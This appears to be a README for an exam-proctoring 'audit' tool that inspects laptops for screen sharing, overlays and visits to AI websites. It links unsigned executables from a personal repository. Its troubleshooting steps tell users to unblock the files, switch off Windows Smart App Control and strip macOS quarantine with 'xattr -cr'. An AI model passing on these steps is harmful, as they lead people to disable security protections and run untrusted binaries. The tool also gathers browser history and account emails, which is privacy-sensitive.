# TPV Post-Assessment Forensic Laptop Audit

Official cross-platform proctoring forensic audit toolset for **Windows**, **macOS**, and **Linux**.

---

## 📥 Downloads

| Platform | Download Package | Quick Instructions |
| :--- | :--- | :--- |
| **Windows** | [📥 **Download `Audit_Windows.zip`**](https://github.com/Hello9119-ai/Audit-/raw/main/Audit_Windows.zip) | 1. Extract `Audit_Windows.zip`<br>2. Double-click **`Audit.exe`**<br>3. Enter hours (or press **Enter** for default: 2) |
| **macOS** | [📥 **Download `Audit_Mac.zip`**](https://github.com/Hello9119-ai/Audit-/raw/main/Audit_Mac.zip) | 1. Extract `Audit_Mac.zip`<br>2. Double-click **`Audit.command`** (or `Audit.app`)<br>3. Enter hours (or press **Enter** for default: 2) |
| **Linux** | [📥 **Download `Audit_Linux.zip`**](https://github.com/Hello9119-ai/Audit-/raw/main/Audit_Linux.zip) | 1. Extract `Audit_Linux.zip`<br>2. Run `./Audit_Linux` in Terminal (`chmod +x Audit_Linux`)<br>3. Enter hours (or press **Enter** for default: 2) |

---

## 🛠️ Troubleshooting & Issue Resolution

### 1. Windows Issues

#### ⚠️ "Smart App Control blocked an app that may be unsafe" or "Windows protected your PC"
* **Why this happens**: Windows 11 Smart App Control (SAC) blocks newly downloaded unsigned `.exe` files if they carry the browser's internet download tag (*Mark of the Web* / `:Zone.Identifier`), or if double-clicked directly from inside the `.zip` without extracting.
* **Resolution (Choose one)**:
  1. **Unblock the Zip (Recommended)**:
     * Right-click the downloaded **`Audit_Windows.zip`** file.
     * Click **Properties**.
     * At the bottom, check the box labeled **"Unblock"** and click **Apply** / **OK**.
     * Now extract the zip and double-click **`Audit.exe`**.
  2. **Extract Before Running**:
     * Do **NOT** double-click `Audit.exe` directly inside the compressed folder view.
     * Right-click `Audit_Windows.zip` &rarr; click **Extract All...** &rarr; open the extracted folder and run `Audit.exe`.
  3. **PowerShell 1-Line Unblock**:
     * Open PowerShell in the folder and run:
       ```powershell
       Unblock-File .\Audit.exe; .\Audit.exe
       ```
  4. **Smart App Control Setting (If strictly enforced)**:
     * Open **Windows Security** &rarr; **App & browser control** &rarr; **Smart App Control settings** &rarr; turn **Off**.

#### ⚠️ Script Exited Immediately / No Checks Were Run
* **Why this happened**: In older builds, environments with custom `%PATH%` variables or restricted stdin pipelines could not launch the background engine.
* **Resolution**:
  * This is **fully resolved** in the latest `Audit_Windows.zip` build using deterministic system path resolution and native execution.
  * If the laptop is on a strict corporate/school domain, right-click **`Audit.exe`** and select **"Run as administrator"**.

---

### 2. macOS Issues

#### ⚠️ "This version of Mac is not compatible" / Error `-47`
* **Why this happens**: Older versions of macOS or Gatekeeper App Translocation can fail to parse the `.app` bundle format when extracted from Downloads.
* **Resolution (Universal 1-Click)**:
  * Double-click **`Audit.command`** instead of `Audit.app`.
  * `Audit.command` is a universal Mach-O binary compiled for **both Apple Silicon (M1/M2/M3/M4) and Intel Macs**. It runs natively across all macOS releases and completely bypasses App Translocation.

#### ⚠️ "Audit.command cannot be opened because it is from an unidentified developer"
* **Resolution**:
  1. Right-click **`Audit.command`** &rarr; select **Open**.
  2. In the confirmation dialog, click **Open**.
  3. Alternatively, open Terminal and remove the quarantine attribute:
     ```bash
     xattr -cr /path/to/Audit_Mac.zip
     ```

---

### 3. Linux Issues

#### ⚠️ "Permission denied" when launching `Audit_Linux`
* **Resolution**:
  * Grant executable permissions before running:
    ```bash
    chmod +x Audit_Linux
    ./Audit_Linux
    ```
  * `Audit_Linux` is a statically linked 64-bit ELF executable with zero external library dependencies; it runs out-of-the-box on Ubuntu, Debian, Fedora, Arch, CentOS, Mint, and RHEL.

---

## 🔍 Invigilator 5-Second Checklist

The tool performs local, read-only system forensic checks across 5 core compliance areas:

1. **Screen Mirroring / Display Cloning**: Detects active duplicate coordinate clones, virtual display drivers (Duet, Spacedesk, IddCx), and hardware HDMI capture dongles (Elgato, Cam Link).
2. **Actual Screen Share / Remote Control Session**: Detects confirmed active or logged screen sharing sessions (**AirPlay, Apple Screen Sharing / VNC, Windows RDP, FaceTime / Messages SharePlay, AnyDesk, TeamViewer, Zoom CptHost, and WebRTC browser streaming**) with exact start/end timestamps, total duration, and remote partner/client proof. Excludes all physical console logons.
3. **Screen Overlay & Laser Pointer Detection**: Identifies virtual laser pointer or cursor highlighting tools (e.g. Presentify, CursorPro, ProMouse, Gromit-MPX) that render moving red dots or screen overlays.
4. **AI Website / Solver Visited & Extensions**: Analyzes browser history timelines with exact timestamps, dwell time, user account email, and specific problem/chat URLs (Gemini, ChatGPT, Claude, DeepSeek, Copilot, etc.). Audits browser extensions for sideloaded test-cheating tools.
5. **Browser History Wiped / Tampered**: Recovers deleted AI visits from the internal Omnibox shortcut cache.
